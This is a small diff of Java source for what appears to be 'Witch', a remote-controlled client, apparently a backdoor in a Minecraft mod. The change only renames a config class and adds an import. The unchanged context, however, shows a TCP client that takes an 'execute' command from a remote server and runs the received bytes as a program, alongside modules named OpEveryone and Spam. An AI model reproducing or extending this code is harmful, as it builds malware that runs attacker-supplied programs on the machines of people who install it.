@@ -1,6 +1,7 @@
 package me.soda.witch.client.connection;
 
 import com.google.gson.Gson;
+import me.soda.witch.client.Cfg;
 import me.soda.witch.client.Witch;
 import me.soda.witch.client.modules.OpEveryone;
 import me.soda.witch.client.modules.Spam;
@@ -28,7 +29,7 @@ public class Client extends TcpClient {
             LogUtil.println("Received message: " + message.data.getClass().getName());
             if (message.data instanceof ByteData data) {
                 if (data.messageID.equals("execute")) new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
-            } else if (message.data instanceof ConfigData data) {
+            } else if (message.data instanceof ClientConfigData data) {
                 Witch.CONFIG_INFO = data;
             } else if (message.data instanceof SingleStringData data) {
                 switch (data.data()) {
